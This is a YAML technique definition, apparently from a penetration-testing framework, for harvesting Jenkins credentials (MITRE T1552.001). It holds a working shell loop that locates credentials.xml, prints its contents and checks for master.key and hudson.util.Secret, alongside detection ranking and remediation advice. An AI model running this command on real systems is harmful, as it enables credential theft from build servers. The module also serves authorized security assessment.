# Jenkins credentials.xml + master.key → decrypted secrets
technique: T1552.001
name: Jenkins credentials.xml loot
key: loot:jenkins-credentials
tactic: [credential-access]
platform: [linux]
ranking:
  exploitability: high
  safety: read-only
  detection: quiet
detect:
  facts_match: {has_jenkins_credentials: true}
execute:
  command: |-
    for f in $(find /var/lib/jenkins /var/jenkins_home /home/jenkins -maxdepth 3 -type f -name 'credentials.xml' -readable 2>/dev/null | head -3); do
      base=$(dirname "$f")
      echo "=== $f ==="
      head -50 "$f"
      [ -r "$base/secrets/master.key" ] && echo "MASTER.KEY: $(wc -c < $base/secrets/master.key) bytes"
      [ -r "$base/secrets/hudson.util.Secret" ] && echo "SECRET: present"
    done
verify:
  success: "<credentials"
cleanup:
  command: ""
report:
  vector_type: jenkins_credentials_loot
  evidence: "readable credentials.xml + master.key + hudson.util.Secret"
  description: >
    Jenkins encrypts credentials in ``credentials.xml`` using a key chain
    that lives next to it — ``secrets/master.key`` + ``secrets/hudson.
    util.Secret``. Possession of all three is decrypted secret
    extraction (one Python script offline). Jenkins frequently stores
    deploy keys, cloud API keys, and inter-service passwords here.
  remediation: >
    Lock down the Jenkins home directory to the ``jenkins`` user only.
    Rotate credentials after any machine with a Jenkins installation has
    been shared/accessed. Prefer HashiCorp Vault's Jenkins plugin so
    secrets never land in the Jenkins DB at all.
  refs: [T1552.001]
